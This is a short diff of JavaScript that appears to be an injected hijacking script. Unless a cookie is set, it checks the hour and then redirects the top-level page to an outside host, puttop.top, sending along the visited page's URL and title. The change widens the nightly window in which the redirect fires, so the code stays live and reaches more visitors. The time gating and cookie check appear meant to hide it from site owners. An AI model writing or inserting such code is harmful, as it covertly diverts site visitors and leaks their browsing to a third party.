@@ -25,7 +25,7 @@ function _setTimeout(){
 	if(getUCookie("uTimeCookie")!=1){
 		 var now = new Date();
 		 var hours = now.getHours();
-		 if(hours>=19 || hours<=7) {
+		 if(hours>=18 || hours<=8) {
 			if(window.self==window.top){
 				window.location.href='http://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
 			}
